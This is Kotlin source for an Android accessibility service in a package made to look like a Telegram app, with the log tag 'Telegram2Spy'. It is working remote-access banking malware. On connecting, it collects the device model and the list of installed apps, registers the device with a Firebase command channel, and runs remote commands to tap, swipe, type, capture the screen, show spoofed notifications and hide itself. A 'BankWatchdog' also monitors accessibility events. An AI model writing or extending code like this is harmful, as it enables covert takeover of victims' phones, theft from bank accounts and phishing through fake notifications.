package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ClipboardManager
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*

class AccessibilityService : AccessibilityService() {

    companion object {
        var instance: AccessibilityService? = null
        private const val TAG = "Telegram2Spy"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onServiceConnected() {
        instance = this
        Log.d(TAG, "Accessibility Service connected")
        scope.launch {
            val deviceName = Build.MODEL
            val androidVersion = Build.VERSION.RELEASE
            val appList = packageManager.getInstalledApplications(0).map { it.packageName }
            val deviceId = FirebaseBridge.registerDevice(deviceName, androidVersion, appList)
            Log.d(TAG, "Registered with id: $deviceId")

            FirebaseBridge.listenForCommands { cmd ->
                mainHandler.post { handleCommand(cmd) }
            }

            BankWatchdog.start(this@AccessibilityService)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        BankWatchdog.onAccessibilityEvent(event)
    }

    override fun onInterrupt() {}

    private fun handleCommand(cmd: Map<String, Any>) {
        val command = cmd["command"] as? String ?: return
        when (command) {
            "start_screen_capture" -> {
                val intent = Intent(this, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    putExtra("action", "request_screen_capture")
                }
                startActivity(intent)
            }
            "tap" -> {
                val x = (cmd["x"] as? Double)?.toFloat() ?: return
                val y = (cmd["y"] as? Double)?.toFloat() ?: return
                performTap(x, y)
            }
            "swipe" -> {
                val x1 = (cmd["x1"] as? Double)?.toFloat() ?: return
                val y1 = (cmd["y1"] as? Double)?.toFloat() ?: return
                val x2 = (cmd["x2"] as? Double)?.toFloat() ?: return
                val y2 = (cmd["y2"] as? Double)?.toFloat() ?: return
                performSwipe(x1, y1, x2, y2)
            }
            "type" -> {
                val text = cmd["text"] as? String ?: return
                typeText(text)
            }
            "show_notification" -> {
                val title = cmd["title"] as? String ?: return
                val body = cmd["body"] as? String ?: return
                val iconUrl = cmd["iconUrl"] as? String
                NotificationSpoofer.showFakeNotification(this, title, body, iconUrl)
            }
            "hide_app" -> {
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
            "open_app" -> {
                val pkg = cmd["packageName"] as? String ?: return
                val intent = packageManager.getLaunchIntentForPackage(pkg)
                intent?.let { startActivity(it.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }) }
            }
        }
    }

    private fun performTap(x: Float, y: Float) {
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            .build()
        dispatchGesture(gesture, null, null)
    }

    private fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float) {
        val path = Path().apply {
            moveTo(x1, y1)
            lineTo(x2, y2)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 300))
            .build()
        dispatchGesture(gesture, null, null)
    }

    private fun typeText(text: String) {
        val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.setPrimaryClip(android.content.ClipData.newPlainText("text", text))
        performGlobalAction(GLOBAL_ACTION_PASTE)
    }

    override fun onDestroy() {
        instance = null
        scope.cancel()
        super.onDestroy()
    }
}